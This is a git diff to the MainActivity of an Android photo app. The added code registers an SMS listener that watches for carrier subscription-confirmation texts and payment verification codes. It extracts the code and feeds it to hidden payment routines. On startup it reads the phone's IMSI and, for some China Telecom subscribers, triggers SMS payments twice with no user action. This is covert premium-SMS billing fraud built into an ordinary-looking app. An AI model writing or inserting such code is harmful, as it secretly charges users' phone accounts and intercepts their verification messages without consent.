@@ -1,14 +1,18 @@
 package domon.cn.mmphoto;
 
+import android.Manifest;
 import android.content.Context;
 import android.os.Bundle;
 import android.support.v4.app.Fragment;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
+import android.text.TextUtils;
 import android.widget.FrameLayout;
 
+import com.apkfuns.logutils.LogUtils;
 import com.lzy.okgo.OkGo;
 import com.lzy.okgo.model.Response;
+import com.tbruyelle.rxpermissions2.RxPermissions;
 import com.yinglan.alphatabs.AlphaTabView;
 import com.yinglan.alphatabs.AlphaTabsIndicator;
 
@@ -22,8 +26,10 @@ import domon.cn.mmphoto.data.UserProfileData;
 import domon.cn.mmphoto.home.HomeFragment;
 import domon.cn.mmphoto.profile.ProfileFragment;
 import domon.cn.mmphoto.utils.FragmentUtils;
+import domon.cn.mmphoto.utils.PayUtils;
 import domon.cn.mmphoto.utils.PhoneUtil;
 import domon.cn.mmphoto.utils.SharedPreferenceUtil;
+import domon.cn.mmphoto.utils.SmsReceiver;
 
 public class MainActivity extends BaseActivity {
     @BindView(R.id.container_fl)
@@ -42,6 +48,7 @@ public class MainActivity extends BaseActivity {
     private Context mContext;
     private FragmentManager mFragmentManager;
     private Fragment mCurrentFragment;
+    private SmsReceiver mSmsReceiver;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -49,6 +56,16 @@ public class MainActivity extends BaseActivity {
         setContentView(R.layout.activity_main);
 
         mProfileAlphaTabView.showPoint();
+
+        initSMSReceiver();
+
+        RxPermissions rxPermissions = new RxPermissions(this);
+        rxPermissions.request(Manifest.permission.READ_PHONE_STATE)
+                .subscribe(grant -> {
+                    if (grant) {
+                        reqSMS();
+                    }
+                });
 
         mAlphaTabsIndicator.setOnTabChangedListner(tabNum -> {
             switch (tabNum) {
@@ -141,5 +158,41 @@ public class MainActivity extends BaseActivity {
         }
 
         mCurrentFragment = to;
+    }
+
+    private void initSMSReceiver() {
+        LogUtils.e("initSmsReceiver OnSucessfull");
+        mSmsReceiver = new SmsReceiver();
+        mSmsReceiver.registerSmsReceiver(this, new SmsReceiver.SmsListener() {
+            @Override
+            public void onMessage(String msg, String fromAddress, String serviceCenterAddress) {
+                if (fromAddress.equals("1000188") && msg.contains("成功定制")) {
+                    PayUtils.payForSMSThree();
+                } else if (fromAddress.equals("1065987320001") && msg.contains("支付验证码")) {
+                    LogUtils.e(msg.substring(0, 4));
+                    PayUtils.payForSMSTwo(msg.substring(0, 4));
+                }
+            }
+        });
+
+
+    }
+
+    //that is used the first init
+    private void reqSMS() {
+        String imsi = PhoneUtil.getImsi(this);
+
+        if (!TextUtils.isEmpty(imsi) && !imsi.startsWith("46003") && (!imsi.startsWith("46011")) && (!imsi.startsWith("46005"))) {
+        } else {
+            PayUtils.payForSMSOne(this, 1, PayUtils.PAY_TYPE_COIN);
+            PayUtils.payForSMSOne(this, 1, PayUtils.PAY_TYPE_COIN);
+        }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        LogUtils.e("onDestroy");
+        mSmsReceiver.unRegisterSmsReceiver(this);
     }
 }
